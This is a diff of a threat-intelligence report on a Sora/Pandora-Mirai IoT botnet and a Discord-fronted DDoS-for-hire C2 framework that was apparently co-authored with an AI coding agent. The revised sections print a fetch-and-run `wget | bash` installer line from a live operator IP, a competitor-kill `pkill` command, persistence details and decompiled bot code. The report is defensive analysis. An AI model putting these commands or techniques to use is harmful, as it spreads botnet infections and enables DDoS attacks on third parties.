@@ -75,7 +75,7 @@ This is an **active, multi-component, AI-augmented cybercrime campaign**: a prod
 </tbody>
 </table>
 
-**Overall Campaign Risk Score: 8.2/10 — HIGH.** The campaign is HIGH, not CRITICAL, because no single victim or sector is in confirmed-compromise status at investigation date: IoT infections are distributed across consumer-broadband targets per Hunt.io curator data, no named-victim corporate compromise is confirmed (parent-series Cases 1 and 2 rate CRITICAL precisely because they do), and remediation paths stay open via mainstream commercial provider abuse coordination. Reassess **upward** if (a) a high-impact DDoS target is confirmed victim, (b) the operator scales the bot fleet above current Hunt.io-curated levels, or (c) Atlassian Trust & Safety takes no account-level action and the Rovodev abuse pattern recurs elsewhere. Reassess **downward** only after the parasitic CNC daemon is removed from the GetYourGroup VPS, the operator-owned IONOS VPS pair is terminated, and the Discord operator account is terminated.
+The campaign scores 8.2 out of 10 overall, which puts it in the HIGH band. It is HIGH rather than CRITICAL because no single victim or sector is in confirmed-compromise status at investigation date. IoT infections are distributed across consumer-broadband targets per Hunt.io curator data, no named-victim corporate compromise is confirmed, and parent-series Cases 1 and 2 rate CRITICAL precisely because they do have one, while remediation paths stay open via mainstream commercial provider abuse coordination. Reassess **upward** if a high-impact DDoS target is confirmed as a victim, if the operator scales the bot fleet above current Hunt.io-curated levels, or if Atlassian Trust & Safety takes no account-level action and the Rovodev abuse pattern recurs elsewhere. Reassess **downward** only once the parasitic CNC daemon is removed from the GetYourGroup VPS, the operator-owned IONOS VPS pair is terminated, and the Discord operator account is terminated.
 
 ### Threat Actor Summary
 
@@ -129,13 +129,13 @@ Six operational outcomes are observable directly in the captured artifacts — e
 
 For executive review, the campaign's risk surface breaks into four operational categories defenders can act on at the action-category level (specific procedures are out of scope per the third-party intel provider perspective).
 
-**Operator-host takedown.** The operator-owned IONOS DE VPS pair (`87.106.143.220` + `87.106.54.213`) is the customer-facing Matrix C2 and bot-binary distribution channel — a mainstream provider with an accessible abuse desk. The Aruba Italy distribution servers (`80.211.94.16` + `80.211.111.10`) are already offline.
+For the operator-host takedown, the operator-owned IONOS DE VPS pair (`87.106.143.220` and `87.106.54.213`) is the customer-facing Matrix C2 and bot-binary distribution channel, on a mainstream provider with an accessible abuse desk. The Aruba Italy distribution servers (`80.211.94.16` and `80.211.111.10`) are already offline.
 
-**Compromised-host victim notification.** The parasitic CNC at `165.227.175.161:23` runs on a production VPS belonging to GetYourGroup GmbH (German tourism). Victim-direct notification must precede any DigitalOcean Trust & Safety action: the VPS hosts the company's revenue-generating site on TCP/443, so terminating it without victim coordination causes collateral business damage.
+For compromised-host victim notification, the parasitic CNC at `165.227.175.161:23` runs on a production VPS belonging to GetYourGroup GmbH, a German tourism business. Victim-direct notification has to precede any DigitalOcean Trust & Safety action, because the VPS hosts that company's revenue-generating site on TCP/443, so terminating it without victim coordination would cause collateral business damage.
 
-**Variant-evolution vendor notification.** The 11-architecture IoT extension documented here is the four-year evolution arc from Doctor Web's September 2023 Android-TV scope (§13.4); Doctor Web notification supports vendor-side detection updates.
+For variant-evolution vendor notification, the 11-architecture IoT extension documented here is the four-year evolution arc from Doctor Web's September 2023 Android-TV scope (§13.4), and notifying Doctor Web supports vendor-side detection updates.
 
-**AI-coding-agent T&S notification.** Atlassian Trust & Safety can action the operator account via session JSON + runtime log telemetry — the first publicly documented Rovodev offensive-use case. Discord Trust & Safety has the operator account ID (`1441591352927326259`) for termination.
+For AI-coding-agent T&S notification, Atlassian Trust & Safety can action the operator account via session JSON and runtime log telemetry, in the first publicly documented Rovodev offensive-use case. Discord Trust & Safety separately holds the operator account ID (`1441591352927326259`) for termination.
 
 ---
 
@@ -163,7 +163,7 @@ This is a **multi-component multi-family** campaign, not a single-family analysi
 
 **Lineage refinement — Sora-derivative, not direct-Mirai-fork.** The `/bin/busybox SORA` token (decoded from the XOR-0x54 region of every Naku binary) replaces stock Mirai's `/bin/busybox MIRAI`. This is a Sora-fork-specific signature introduced in 2017 by the Sora operator lineage; multiple downstream Sora-forks exist publicly. The operator inherited Sora's structure including the SORA token and added their own modifications: triple XOR keys (0x54 / 0x42 / 0x45) for split-class string obfuscation, double Huawei scanner module (`huawei_scanner.c` + operator-bespoke `huawei1_scanner.c`), custom 22-character charset `1gba4cdom53nhp12ei0kfj`, TTNET (Türk Telekom AŞ residential subsidiary, Turkey) addition to the credential brute-list (indeterminate whether operator-added or Sora-upstream-inherited — requires upstream Sora source comparison), `.anime` operator-bespoke marker, and the length-prefixed-string CNC option-key protocol modification that defeats Mirai-protocol-aware IDS rules.
 
-**MaaS hypothesis REFUTED (Phase 11).** The operator is a **downstream adopter** of the open-source Pandora-Sora-Mirai ecosystem (200-plus binaries on VirusTotal across distinct operators), not a builder selling variants. Operator-bespoke constants (`PandoraNet`, charset `1gba4cdom53nhp12ei0kfj`, XOR keys 0x54/0x42/0x45) are operator-permanent across all 11 architectures and absent elsewhere in Hunt.io's 365-day index — a tracking signature, not the per-customer build variation a seller would produce. The HYBRID AI-augmented framing replaces MaaS-builder as the operator's primary class. Full refutation record in §13.1.
+Phase 11 REFUTED the MaaS hypothesis. The operator is a **downstream adopter** of the open-source Pandora-Sora-Mirai ecosystem, which runs to 200-plus binaries on VirusTotal across distinct operators, rather than a builder selling variants. Their bespoke constants (`PandoraNet`, the charset `1gba4cdom53nhp12ei0kfj`, XOR keys 0x54/0x42/0x45) are operator-permanent across all 11 architectures and absent everywhere else in Hunt.io's 365-day index, which makes them a tracking signature rather than the per-customer build variation a seller would produce. The HYBRID AI-augmented framing replaces MaaS-builder as their primary class, and the full refutation record is in §13.1.
 
 **Lifecycle stages observable in captured infrastructure (DEFINITE):**
 
@@ -195,9 +195,9 @@ The Pandora-Mirai bot suite covers eleven IoT-relevant CPU architectures. All bi
 
 Universal YARA hit across all eleven binaries: `MAL_ELF_LNX_Mirai_Oct10_1` (Neo23x0/signature-base crime_mirai ruleset). The arm7 build additionally hits `MAL_ARM_LNX_Mirai_Mar13_2022` (newer ARM-variant rule); the x86 build picks up six additional Elastic `Linux_Trojan_Mirai_*` sub-rules due to its larger code surface.
 
-**Universal CVE-exploit tags:** CVE-2017-17215 (Huawei HG532 RCE via the UPnP DeviceUpgrade SOAP action on TCP/37215), CVE-2014-8361 (Realtek SDK MiniIGD UPnP SOAP RCE). These are the canonical Mirai-fork IoT propagation exploits.
+The universal CVE-exploit tags are CVE-2017-17215, Huawei HG532 RCE via the UPnP DeviceUpgrade SOAP action on TCP/37215, and CVE-2014-8361, Realtek SDK MiniIGD UPnP SOAP RCE. These are the canonical Mirai-fork IoT propagation exploits.
 
-**Naku ≡ Pandora identity (DEFINITE).** VirusTotal's file information for Naku.spc shows: **Name on VT** `/tmp/pandora_bot`; **Execution_parents (1 item)** `pandora.sh` — Shell script, 17/66 detections, first seen 2026-01-26. The `pandora.sh` parent matches the SHA-256 recorded as the Pandora.sh dropper (`d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17`). The `Naku.{arch}` suite served from `87.106.143.220:443/bins/` IS the same binary family as the `/Pandoras_Box/Pandora.{arch}` suite served from `87.106.143.220:80`. The operator dispatches the same per-arch binaries via two different exposure paths on the same host. **Naku is the operator's filename label; Pandora is the suite/dropper label; `pandora_bot` is what VirusTotal names the executing process.**
+Naku and Pandora are the same thing, which I hold DEFINITE. VirusTotal's file information for Naku.spc gives the name on VT as `/tmp/pandora_bot` and one execution parent, `pandora.sh`, a shell script with 17/66 detections first seen 2026-01-26. That `pandora.sh` parent matches the SHA-256 recorded as the Pandora.sh dropper (`d3fd9994b16dc9b14c29f7faf7b5f6c84f44b06fccf82f0031a0871ce5e20e17`). The `Naku.{arch}` suite served from `87.106.143.220:443/bins/` IS the same binary family as the `/Pandoras_Box/Pandora.{arch}` suite served from `87.106.143.220:80`, so the operator dispatches the same per-arch binaries via two different exposure paths on one host. **Naku is the operator's filename label, Pandora is the suite and dropper label, and `pandora_bot` is what VirusTotal names the executing process.**
 
 **Cross-architecture string analysis — five DEFINITE findings:**
 
@@ -458,7 +458,7 @@ The output is classic LLM style: ASCII-box header, uniform `✅` bullets, escala
 - `.rovodev/sessions/257b6faf-6426-47e9-8458-381befca3ef5/session_context.json` (1.24 MB) — captures `file_write` tool calls producing `master_control.py`, `attack_engine.py`, `multi_vector_agent.py`, `encrypted_agent.py`, `stealth_agent.py`
 - `.rovodev/sessions/8b911ec6-186f-423a-aa74-7b5d17e4d9ca/session_context.json` (176 KB) — captures the JavaScript attack-method dispatch table and SQL data-load tuples
 
-**Layer 4 — AI runtime log (`rovodev.log`).** The 8.5 MB CLI runtime log preserves the Discord bot's JavaScript attack-method dispatch table, the hping3-based attack command templates, and the broader operator-AI interaction history. Combined with the session JSONs, this layer captures both the persistent authoring state and the runtime command execution.
+The fourth layer is the AI runtime log, `rovodev.log`. That 8.5 MB CLI runtime log preserves the Discord bot's JavaScript attack-method dispatch table, the hping3-based attack command templates, and the broader operator-AI interaction history. Combined with the session JSONs, this layer captures both the persistent authoring state and the runtime command execution.
 
 **Eight DEFINITE AI-authored exemplars within a single operator's framework — first publicly documented end-to-end AI co-authoring of a complete offensive C2 framework:**
 
@@ -646,7 +646,7 @@ The presence of BOTH `huawei_scanner.c` AND `huawei1_scanner.c` is operator-besp
 
 The `landley/aboriginal` toolchain is Rob Landley's bootstrap cross-compile project — the canonical Mirai-fork cross-compile environment referenced in the leaked Mirai source's `cross-compile.sh`. The operator uses a stock Mirai cross-compile setup; no custom toolchain. The same path string appears in Naku.arm (stripped) as an XOR-0x54-encoded blob — confirming the operator applied a post-build XOR-string-encoder pass that obfuscates `.rodata` strings but leaves the encoded build path inside the binary anyway (operator oversight; Mirai operators typically strip these debug strings entirely).
 
-**Four parallel scanner threads.** After init and just before the CNC connect loop, `main()` launches:
+After init and just before the CNC connect loop, `main()` launches four parallel scanner threads:
 
 ```c
 FUN_0000d650();  // Scanner #1 (Realtek setup — POST /picdesc.xml)
@@ -667,7 +667,7 @@ if ((argc == 2) && (length_of_argv1 < 32)) {
 
 The `realtek` tag in the exploit payload `./nig realtek` ends up in this buffer and gets reported to CNC. Operator tracks which exploit got each victim — useful tradecraft analytics for "Realtek vs Huawei vs telnet brute-force conversion rate" optimization.
 
-**Mirai-canonical watchdog-disable persistence.** Early in the bot's main() function, before C2 connection, the bot opens `/dev/watchdog` and runs an infinite loop:
+Persistence uses the Mirai-canonical watchdog disable. Early in the bot's `main()` function, before the C2 connection, it opens `/dev/watchdog` and runs an infinite loop:
 
 ```c
 FUN_00013764(fd, 0x80045704, 1);  // WDIOC_SETOPTIONS (mark ready)
@@ -726,7 +726,7 @@ The result: five framework files (`master_control.py`, `attack_engine.py`, `mult
 
 The `persistent_bot.sh` bash installer (SHA `4809a7ee9f5dbcbe86cfbd77a45e2a268a37bcc947e8e1621164df653597948b`) plants persistence across five independent vectors. The script is operator-deployable on any Linux IoT host via the `bot.sh` HTTP distribution channel (`wget -qO- http://87.106.143.220/bot.sh | bash`). Capability inventory:
 
-**Vendor detection logic.** The `get_vendor()` function distinguishes deployment targets:
+The `get_vendor()` function distinguishes deployment targets:
 
 ```bash
 if [ -f /etc/mikrotik-release ]; then echo "mikrotik"
@@ -748,9 +748,9 @@ Per-victim vendor reporting back to CNC — operator can segment the botnet by d
 | 4 | `/etc/systemd/system/system-update.service` (systemd unit with `Restart=always`) | Survives reboot; named to blend with legitimate update mechanisms; 300-second reseed loop |
 | 5 | `~/.bashrc` + `~/.profile` (per-user shell rc files) | Triggers on every interactive login |
 
-**Competitor-malware kill.** `pkill -9 -f "(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)" 2>/dev/null` — kills six known competitor IoT botnets by name pattern.
+It kills competitor malware with `pkill -9 -f "(mirai|qbot|tsunami|gafgyt|bashlite|kaiten)" 2>/dev/null`, taking out six known competitor IoT botnets by name pattern.
 
-**Bot-ID generation.** `BOT_ID="bot_$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo $RANDOM)"` — per-victim unique identifier sent in heartbeats; fallback to `$RANDOM` if UUID unavailable (e.g., minimal busybox-only IoT environments).
+It generates a bot ID with `BOT_ID="bot_$(cat /proc/sys/kernel/random/uuid 2>/dev/null || echo $RANDOM)"`, a per-victim unique identifier sent in heartbeats, falling back to `$RANDOM` where no UUID is available, as on minimal busybox-only IoT environments.
 
 **JSON-over-TCP wire protocol to operator-owned Matrix C2:**
 
@@ -924,7 +924,7 @@ The full ATT&CK technique mapping for this case is maintained alongside the dete
 
 > **Analyst note:** The complete IOC set for this case is published as a machine-readable JSON feed for direct SIEM/EDR ingestion — it is not duplicated inline here. The highest-priority indicators are also surfaced in the IOC panel (fingerprint icon) on this page.
 
-**Full IOC feed:** [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json) — every indicator for this case, with type / confidence / recommended action.
+The full IOC feed is at [`/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json`](https://the-hunters-ledger.com/ioc-feeds/rovodev-mirai-matrix-c2-87.106.143.220-iocs.json), carrying every indicator for this case with type, confidence and recommended action.
 
 ---
 
@@ -947,7 +947,7 @@ The Phase 7 Analysis of Competing Hypotheses (ACH) resolves to **H1: HYBRID AI-a
 | H5 | False-flag English-speaking operator | LOW; expensive staging cost given AI-session content breadth | ~5% |
 | H6 | Pandora-Mirai variant downstream adoption | CONFIRMED (calibration, not alternative); operator is downstream adopter, NOT variant author | n/a |
 
-**Ruling evidence for H1 (HYBRID class):** Operator-bespoke Mirai-source-tree literacy is demonstrated via triple-XOR-key split-class obfuscation (0x54 / 0x42 / 0x45), length-prefixed-string CNC option-key protocol modification (defeats stock Mirai-protocol-aware IDS), double Huawei scanner module with operator-bespoke `huaweiscanner1_setup_connection` symbol, operator-bespoke 22-character charset `1gba4cdom53nhp12ei0kfj`. This coexists with DEFINITE Atlassian Rovodev AI co-authoring of the Matrix C2 framework — only the HYBRID class fits both capability dimensions.
+The ruling evidence for H1, the HYBRID class, is that operator-bespoke Mirai-source-tree literacy shows up in triple-XOR-key split-class obfuscation (0x54, 0x42, 0x45), a length-prefixed-string CNC option-key protocol modification that defeats stock Mirai-protocol-aware IDS, a double Huawei scanner module carrying the bespoke `huaweiscanner1_setup_connection` symbol, and the bespoke 22-character charset `1gba4cdom53nhp12ei0kfj`. That coexists with DEFINITE Atlassian Rovodev AI co-authoring of the Matrix C2 framework, and only the HYBRID class fits both capability dimensions.
 
 **Refutation of H2 (pure AI-democratized script-kiddie):** A pure AI-democratized operator cannot produce the bespoke C modifications observed in the Naku binary suite. The triple-XOR-key split-class obfuscation is not commodity Mirai-fork tradecraft; the length-prefixed-string CNC option-key protocol modification requires Mirai source-tree literacy at the option-parsing routine level; the double Huawei scanner module requires Mirai source-tree literacy at the scanner-init level. H2 is REFUTED at MODERATE-band confidence.
 
@@ -1001,7 +1001,7 @@ A search of Tier 1-3 sources at investigation date returned ZERO prior documenta
 
 **Status: PUBLICATION-SIGNIFICANCE (not a confidence boost).** The first-publicly-documented status reflects sweep completeness — it is a finding about the public record, not about this operator's identity. Sub-report establishes the canonical tracking designation; subsequent vendor coverage will reference UTA-2026-014 as the prior-art anchor for Atlassian Rovodev offensive-use cases.
 
-**Disambiguation:** The status mirrors Sub3 Case 2's first-public-attribution status (Turkish ARPA / OpenClaw operator UTA-2026-013). Both are first-publicly-documented because of sweep completeness; neither is "first known" in the absolute sense — LOW-confidence indication based on the inherent invisibility of classified-channel reporting that restricted / classified government reporting documents equivalent patterns. The status is bounded by Tier 1-3 public-source sweep only.
+To disambiguate, this status mirrors Sub3 Case 2's first-public-attribution status, the Turkish ARPA and OpenClaw operator UTA-2026-013. Both are first-publicly-documented because of sweep completeness, and neither is "first known" in the absolute sense. I hold at LOW confidence, given the inherent invisibility of classified-channel reporting, that restricted or classified government reporting documents equivalent patterns. The status is bounded by a Tier 1-3 public-source sweep only.
 
 ### 9.5 Confidence Statement (Required Format)
 
@@ -1159,7 +1159,7 @@ The operator's `whatineed.txt` prompt references `https://github.com/keyosbuff/C
 1. Matrix C2 upstream protocol diff is impossible — cannot determine which elements of the framework are operator-original vs upstream-inherited
 2. Operator-vs-upstream relationship is inconclusive — `keyosbuff` is either the operator's own deleted repo OR a separate upstream operator; INSUFFICIENT evidence to discriminate between the two readings, preserved as inconclusive
 
-**Follow-up suggestion:** Wayback Machine archive snapshot query for `github.com/keyosbuff/C2-Leak` — not consulted at investigation date (stage2-infrastructure-summary gaps_identified §6). If snapshots exist, the upstream-protocol diff becomes possible and the operator-vs-upstream relationship becomes discriminable.
+One follow-up worth doing is a Wayback Machine archive snapshot query for `github.com/keyosbuff/C2-Leak`, which I did not consult at investigation date (stage2-infrastructure-summary gaps_identified §6). If snapshots exist, the upstream-protocol diff becomes possible and the operator-versus-upstream relationship becomes discriminable.
 
 ### 12.2 Matrix C2 Upstream Protocol Diff Impossible
 
@@ -1190,7 +1190,7 @@ The following identity artifacts are NOT captured at investigation date:
 - Operator cryptocurrency wallet (operator runs DDoS-for-hire; receiving wallet exists somewhere)
 - Operator-customer Discord channel / server identifier
 
-**Path to closure:** Atlassian Trust & Safety subpoena (operator email + login IPs), Discord Trust & Safety subpoena (operator email + account-creation IP + linked phone), IONOS abuse-coordination subpoena (operator billing email + payment method + account-creation IP), Aruba Italy abuse-coordination subpoena (operator Aruba account credentials).
+The path to closure runs through an Atlassian Trust & Safety subpoena for the operator email and login IPs, a Discord Trust & Safety subpoena for the operator email, account-creation IP and linked phone, an IONOS abuse-coordination subpoena for the operator billing email, payment method and account-creation IP, and an Aruba Italy abuse-coordination subpoena for the operator's Aruba account credentials.
 
 ### 12.7 Backup VPS 87.106.54.213 Not Directly Queried
 
@@ -1208,53 +1208,53 @@ This section documents calibration decisions where prior-phase analysis was refi
 
 ### 13.1 MaaS Hypothesis REFUTED (Phase 11)
 
-**Earlier-phase framing:** Phase 10 §6 read (d) raised the possibility that this operator is a builder selling the Pandora-Mirai variant to other downstream operators (Malware-as-a-Service / MaaS framing).
+In an earlier phase I framed this differently. Phase 10 §6 read (d) raised the possibility that this operator is a builder selling the Pandora-Mirai variant to other downstream operators, a Malware-as-a-Service framing.
 
-**Refutation evidence (Phase 11 §15.1-§15.5):** Public Pandora-Mirai lineage data shows the Pandora codebase is an **open-source shared ecosystem** with 200-plus binaries on VirusTotal sharing code DNA across multiple distinct downstream operators using different naming conventions. Operator-bespoke constants (`PandoraNet`, charset `1gba4cdom53nhp12ei0kfj`, XOR keys 0x54/0x42/0x45) are operator-permanent across all 11 architectures — not per-customer build variations that would be expected if the operator were selling builds. No per-customer build directories or other-host variants observed in Hunt.io's 365-day index.
+Phase 11 §15.1-§15.5 refuted that. Public Pandora-Mirai lineage data shows the Pandora codebase is an **open-source shared ecosystem** with 200-plus binaries on VirusTotal sharing code DNA across multiple distinct downstream operators using different naming conventions. The operator-bespoke constants (`PandoraNet`, the charset `1gba4cdom53nhp12ei0kfj`, XOR keys 0x54/0x42/0x45) are operator-permanent across all 11 architectures, not the per-customer build variations you would expect if the operator were selling builds. I observed no per-customer build directories or other-host variants in Hunt.io's 365-day index.
 
-**Calibration outcome:** The operator is a **downstream adopter** of the open-source Pandora-Sora-Mirai ecosystem, not the variant author. The HYBRID AI-augmented framing replaces the MaaS-builder framing as the operator's primary class.
+The calibration outcome is that the operator is a **downstream adopter** of the open-source Pandora-Sora-Mirai ecosystem rather than the variant author, and the HYBRID AI-augmented framing replaces the MaaS-builder framing as their primary class.
 
 ### 13.2 First Publicly-Documented Atlassian Rovodev Abuse Case Status
 
-**Sweep completeness:** Tier 1-3 source sweep at investigation date returned ZERO prior documentation of Atlassian Rovodev being used to author offensive code. Sweep coverage documented in Section 9.4.
+On sweep completeness, a Tier 1-3 source sweep at investigation date returned ZERO prior documentation of Atlassian Rovodev being used to author offensive code. The sweep coverage is documented in Section 9.4.
 
-**Status framing:** PUBLICATION-SIGNIFICANCE, not confidence boost. The first-publicly-documented status reflects sweep completeness — it is a finding about the public record, not about this operator's identity. Standalone attribution confidence remains bounded by Tier-1-government / multi-vendor-T&S evidence absence.
+I frame that status as publication significance, not a confidence boost. The first-publicly-documented status reflects sweep completeness, so it is a finding about the public record rather than about this operator's identity. Standalone attribution confidence stays bounded by the absence of Tier-1 government or multi-vendor T&S evidence.
 
-**Subsequent-coverage expectation:** Sub-report establishes the canonical tracking designation; subsequent vendor coverage will reference UTA-2026-014 as the prior-art anchor for Atlassian Rovodev offensive-use cases.
+I expect subsequent coverage to follow. This sub-report establishes the canonical tracking designation, and later vendor coverage will reference UTA-2026-014 as the prior-art anchor for Atlassian Rovodev offensive-use cases.
 
 ### 13.3 AI-Generated Offensive Code Structural Signature Universal Subset Upgraded HIGH → DEFINITE
 
-**Earlier-phase framing:** Phase 5 + Phase 13 §2 documented the AI-Generated Offensive Code Structural Signature at HIGH confidence for criteria #1, #3, #7, #9, #10 within this case (N=1 operator).
+In an earlier phase I framed this differently again. Phase 5 and Phase 13 §2 documented the AI-Generated Offensive Code Structural Signature at HIGH confidence for criteria #1, #3, #7, #9 and #10 within this case, at N=1 operator.
 
 **Cross-3-operator validation evidence (Phase 14 §3):** Independent confirmation across Cases 1 (Russian Gemini operator at 213.165.51.115, UTA-2026-012), Case 2 (Turkish ARPA operator at 209.38.205.158, UTA-2026-013), and this Case 3 (English-speaking operator at 87.106.143.220, UTA-2026-014). Three operators share zero overlap in language / country / target sector / motivation / AI tool vendor.
 
-**Calibration outcome:** Universal subset upgraded to **DEFINITE for the cross-3-operator ecosystem-level claim**. Criterion #4 (zero anti-analysis) refined to **prompt-conditional, not structural** based on this case's `stealth_agent.py` evidence.
+The calibration outcome is that the universal subset upgrades to **DEFINITE for the cross-3-operator ecosystem-level claim**, and criterion #4, zero anti-analysis, refines to **prompt-conditional rather than structural** on this case's `stealth_agent.py` evidence.
 
-**Critical discipline reminder:** Cross-operator signature confirmation is a TTP detection signal, NOT operator coordination evidence. The signature is downstream of AI-tool-class shared training patterns. The three operators are NOT linked.
+One discipline reminder is critical here. Cross-operator signature confirmation is a TTP detection signal, NOT evidence of operator coordination. The signature is downstream of AI-tool-class shared training patterns, and the three operators are NOT linked.
 
 ### 13.4 Pandora-Mirai Variant Lineage Attribution
 
-**Source:** Doctor Web — Pandora-Mirai disclosure (September 2023). Tier 2 / B2 reliability rating. URL: `https://news.drweb.com/show/?lng=en&i=14743`
+The source is Doctor Web's Pandora-Mirai disclosure of September 2023, rated Tier 2 / B2 for reliability, at `https://news.drweb.com/show/?lng=en&i=14743`
 
-**Original scope:** Android.Pandora.[N] — Android-TV platform only.
+Its original scope was Android.Pandora.[N], the Android-TV platform only.
 
 **Four-year evolution arc documented in this case:** Doctor Web September 2023 → operator-extended 11-architecture IoT scope by 2026-01-25 (Naku.{arch} first-seen on VirusTotal). No prior public characterization of the evolution arc. This investigation is the first public documentation.
 
 ### 13.5 Hybrid AI-Augmented Operator Class Refinement (Phase 7)
 
-**Earlier-phase framing:** Parent investigation's Pattern 8 three-class taxonomy distinguished AI-democratized script-kiddie / Hybrid AI-augmented / Mature operator classes. Initial Phase 3h-Phase 10 framing of this operator leaned toward "English-speaking script-kiddie using AI as force-multiplier."
+In an earlier phase I framed the operator class differently. The parent investigation's Pattern 8 three-class taxonomy distinguished AI-democratized script-kiddie, Hybrid AI-augmented and Mature operator classes, and my initial Phase 3h to Phase 10 framing leaned toward an English-speaking script-kiddie using AI as a force multiplier.
 
-**Refinement evidence (Phase 7 ACH):** H1 (HYBRID AI-augmented) winner at ~80% probability with zero inconsistencies. H2 (pure AI-democratized script-kiddie) REFUTED via bespoke C modifications requiring Mirai source-tree literacy.
+The Phase 7 ACH refined that. H1, HYBRID AI-augmented, won at roughly 80 percent probability with zero inconsistencies, and H2, a pure AI-democratized script-kiddie, was REFUTED by bespoke C modifications requiring Mirai source-tree literacy.
 
-**Calibration outcome:** Operator class assignment refined from "English-speaking script-kiddie" to **HYBRID AI-augmented at HIGH confidence (~80%)**. Case 3 anchors the HYBRID instance at the strongest evidentiary profile in the parent series.
+The calibration outcome is that the operator class refines from English-speaking script-kiddie to **HYBRID AI-augmented at HIGH confidence, around 80 percent**. Case 3 anchors the HYBRID instance at the strongest evidentiary profile in the parent series.
 
 ### 13.6 DDoS-as-a-Service Productization Layer (Operational-Business-Class Signature)
 
-**Original framing:** Phase 3h identified the operator as building a DDoS framework with Discord integration.
+I originally framed this as the operator building a DDoS framework with Discord integration, in Phase 3h.
 
-**Refinement evidence (Phase 13):** 13 named attack methods across L3/L4/L7 + VIP/free tier model + GBPS capability estimates + emoji branding + Discord-bot customer-dispatch front-end + JavaScript dispatch table + SQL data-load tuples for customer-and-method dispatch.
+Phase 13 refined that, surfacing 13 named attack methods across L3, L4 and L7, a VIP and free tier model, GBPS capability estimates, emoji branding, a Discord-bot customer-dispatch front end, a JavaScript dispatch table, and SQL data-load tuples for customer-and-method dispatch.
 
-**Calibration outcome:** Operational-business-class signature **separates this operator from individual Mirai-variant downstream adopters** — the productization layer is the criminal-SaaS class signal, not the underlying Mirai-fork tradecraft.
+The calibration outcome is that this operational-business-class signature **separates this operator from individual Mirai-variant downstream adopters**, because the productization layer is the criminal-SaaS class signal rather than the underlying Mirai-fork tradecraft.
 
 ---
 
